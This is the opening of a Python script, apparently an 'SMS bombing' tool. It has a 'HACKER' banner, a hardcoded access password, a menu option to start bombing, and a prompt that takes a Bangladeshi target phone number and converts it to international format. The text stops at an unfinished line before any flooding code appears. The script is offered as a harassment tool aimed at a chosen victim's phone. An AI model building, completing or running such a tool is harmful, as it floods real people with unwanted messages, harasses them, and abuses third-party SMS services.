import os
import time
import threading
import requests

PASSWORD = "PIYAS"

def banner():
    import os
    os.system("clear")

    # RGB green (neon) color
    GREEN = "\033[38;2;57;255;20m"
    RESET = "\033[0m"

    print(rf"""{GREEN}
██╗  ██╗ █████╗  ██████╗ ██╗  ██╗███████╗██████╗
██║  ██║██╔══██╗██╔════╝ ██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║  ███╗█████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

╔═══════════════════════════════════════════════╗
                   ★  P I Y A S  ★
          “Access Granted —→ System Online”
╚═══════════════════════════════════════════════╝
{RESET}""")


def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)

def menu():
    banner()
    print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
    choice = input("Select an option: ")
    if choice == "1":
        start_bombing()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()

def get_target():
    number = input("Enter target number (01XXXXXXXXX): ")
    if number.startswith("01") and len(number) == 11:
        return number, "880" + number[1:]
    else:
        print("Invalid number format.")
        exit()

counter = 